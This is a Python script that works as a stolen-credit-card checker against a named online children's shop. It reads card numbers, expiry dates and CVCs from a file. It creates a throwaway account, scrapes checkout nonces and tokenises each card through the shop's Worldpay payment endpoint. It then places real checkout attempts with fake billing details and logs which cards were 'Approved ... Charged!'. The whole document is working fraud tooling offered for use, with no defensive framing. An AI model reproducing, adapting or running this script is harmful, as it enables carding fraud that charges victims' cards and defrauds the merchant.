import subprocess, sys, os, re, json, time, random, string, urllib.parse, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

AUTHOR = "@wortexbabax"
BASE = "https://kidsmegamall.com"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
PRODUCT_URL = "https://kidsmegamall.com/product/cute-fingerless-gloves/"

def luhn(ccn):
    s = 0
    for i, d in enumerate(reversed(ccn)):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9: n -= 9
        s += n
    return s % 10 == 0

def strip_html(msg):
    m = re.search(r'<li[^>]*>(.*?)</li>', msg, re.DOTALL)
    return m.group(1).strip() if m else re.sub(r'<[^>]+>', '', msg).strip()

def main():
    print(AUTHOR)
    if not os.path.exists("cc.txt"): print("[!] cc.txt not found"); sys.exit(1)
    with open("cc.txt") as f: cards = [l.strip() for l in f if l.strip()]

    s = requests.Session()
    s.verify = False
    rand = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    email = f"{rand}@gmail.com"

    r = s.get(BASE + "/my-account/")
    m = re.search(r'woocommerce-register-nonce" value="([^"]+)"', r.text)
    if not m: print("[!] register nonce"); sys.exit(1)

    s.cookies.clear()
    r = s.post(BASE + "/my-account/", data={
        "email": email, "password": email,
        "woocommerce-register-nonce": m.group(1),
        "_wp_http_referer": "/my-account/", "register": "????????",
    })
    if "wordpress_logged_in" not in str(s.cookies):
        print("[!] register failed"); sys.exit(1)

    r = s.get(PRODUCT_URL)
    m = re.search(r'name="add-to-cart" value="(\d+)"', r.text)
    if not m: print("[!] product_id"); sys.exit(1)
    product_id = m.group(1)

    m = re.search(r'data-product_variations="([^"]+)"', r.text)
    if not m: print("[!] variations"); sys.exit(1)
    variations = json.loads(m.group(1).replace("&quot;", '"').replace("&#092;", "\\"))

    chosen_style = ""
    for opt in re.finditer(r'<option value="([^"]+)"', r.text):
        if opt.group(1): chosen_style = opt.group(1); break
    if not chosen_style: print("[!] no style attr"); sys.exit(1)

    variation_id = "0"
    for v in variations:
        if v.get("attributes", {}).get("attribute_style") == chosen_style:
            variation_id = str(v.get("variation_id", "0")); break
    if variation_id == "0": print("[!] no variation"); sys.exit(1)

    s.post(BASE + "/?wc-ajax=xoo_wsc_add_to_cart", data={
        "attribute_style": chosen_style, "quantity": "1",
        "add-to-cart": product_id, "product_id": product_id,
        "variation_id": variation_id, "action": "xoo_wsc_add_to_cart",
    })
    s.post(BASE + "/?wc-ajax=get_refreshed_fragments", data={"time": str(int(time.time()*1000))})

    r = s.get(BASE + "/checkout/")
    m = re.search(r'update_order_review_nonce":"([^"]+)"', r.text)
    security = m.group(1) if m else None
    m = re.search(r'woocommerce-process-checkout-nonce" value="([^"]+)"', r.text)
    checkout_nonce = m.group(1) if m else None
    m = re.search(r'checkout_id":"([^"]+)"', r.text)
    wp_identity = m.group(1) if m else "fb309fc7-a737-403f-b00b-199832a3b502"
    if not checkout_nonce or not security:
        print("[!] checkout nonce/security"); sys.exit(1)

    billing = {
        "billing_first_name": "Test", "billing_last_name": "User",
        "billing_country": "TR", "billing_address_1": "Test Address",
        "billing_postcode": "34000", "billing_city": "Istanbul",
        "billing_state": "TR34", "billing_phone": "5551234567",
        "billing_email": email,
    }
    shipping = {
        "shipping_first_name": "Test", "shipping_last_name": "User",
        "shipping_country": "TR", "shipping_address_1": "Test Address",
        "shipping_postcode": "34000", "shipping_city": "Istanbul",
        "shipping_state": "TR34",
    }
    s.post(BASE + "/?wc-ajax=update_order_review", data={
        "security": security, "payment_method": "access_worldpay_checkout",
        "country": "TR", "state": "TR34", "postcode": "34000",
        "city": "Istanbul", "address": "Test Address",
        "s_country": "TR", "s_state": "TR34", "s_postcode": "34000",
        "s_city": "Istanbul", "s_address": "Test Address",
        "has_full_address": "true",
        "post_data": urllib.parse.urlencode(billing) + "&payment_method=access_worldpay_checkout",
        "woocommerce-process-checkout-nonce": checkout_nonce,
        "_wp_http_referer": "/?wc-ajax=update_order_review",
    })

    approved, declined = [], []
    for card in cards:
        p = card.split("|")
        if len(p) < 4: continue
        ccn, mes, ano, cvc = p[0].strip().replace(" ", ""), p[1].strip().zfill(2), p[2].strip(), p[3].strip()
        if len(ano) == 4: ano2 = ano
        else: ano2 = "20" + ano

        if not luhn(ccn):
            l = f"#Declined {ccn}|{mes}|{ano}|{cvc} Invalid card number"
            declined.append(l); print(l); continue

        r = requests.post("https://access.worldpay.com/sessions/card",
            headers={
                "accept": "application/vnd.worldpay.sessions-v1.hal+json",
                "content-type": "application/vnd.worldpay.sessions-v1.hal+json",
                "origin": "https://access.worldpay.com",
                "referer": "https://access.worldpay.com/",
                "user-agent": UA, "x-wp-sdk": "access-checkout-web/2.4.0",
            }, data=json.dumps({
                "identity": wp_identity, "cardNumber": ccn,
                "cardExpiryDate": {"month": int(mes), "year": int(ano2)},
                "cvc": cvc,
            }), timeout=30, verify=False)
        try: wp_resp = r.json()
        except: wp_resp = {}
        session_href = wp_resp.get("_links", {}).get("sessions:session", {}).get("href", "")
        if not session_href:
            err = wp_resp.get("error_description") or wp_resp.get("message") or json.dumps(wp_resp)
            l = f"#Declined {ccn}|{mes}|{ano}|{cvc} {err}"
            declined.append(l); print(l); continue

        checkout_data = {
            **billing, **shipping,
            "shipping_method[0]": "free_shipping:6",
            "payment_method": "access_worldpay_checkout",
            "card_holder_name": "Test User",
            "sessionState": session_href,
            "woocommerce-process-checkout-nonce": checkout_nonce,
            "_wp_http_referer": "/?wc-ajax=update_order_review",
        }
        r = s.post(BASE + "/?wc-ajax=checkout", data=checkout_data, timeout=30)
        try: chk = r.json()
        except: chk = {"result": "failure", "messages": "parse error"}

        msg = strip_html(chk.get("messages", "Declined"))
        if chk.get("result") != "failure":
            l = f"#Approved {ccn}|{mes}|{ano}|{cvc} Charged!"
            approved.append(l); print(l)
        else:
            l = f"#Declined {ccn}|{mes}|{ano}|{cvc} {msg}"
            declined.append(l); print(l)
        time.sleep(1)

    with open("approved.txt","w") as f: f.write("\n".join(approved)+"\n" if approved else "")
    with open("declined.txt","w") as f: f.write("\n".join(declined)+"\n" if declined else "")

if __name__ == "__main__":
    main()
